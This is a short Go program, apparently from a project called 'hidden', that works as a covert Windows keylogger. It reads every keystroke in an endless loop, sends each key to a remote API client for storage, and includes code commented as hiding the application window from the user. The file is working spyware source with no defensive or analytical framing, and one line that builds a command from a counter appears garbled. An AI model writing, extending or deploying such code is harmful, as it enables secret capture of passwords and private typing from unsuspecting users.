package main

import (
	"os/exec"
	"syscall"
	"time"

	"github.com/kanadez/hidden/api"
	"github.com/kindlyfire/go-keylogger"
)

const (
	key_fetch_delay_in_ms = 5
)

func main() {

	keylogger := keylogger.NewKeylogger()
	empty_counter := 0
	apiClient := api.NewApiClient()

	for {
		key := keylogger.GetKey()

		if !key.Empty {
			apiClient.StoreKey(key)
		}

		// To hide application window from user
		cmd := exec.Command("cmd", "/C", string(empty_counter))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		// To hold key logging running indefinitely
		empty_counter++
		time.Sleep(key_fetch_delay_in_ms * time.Millisecond)
	}
}
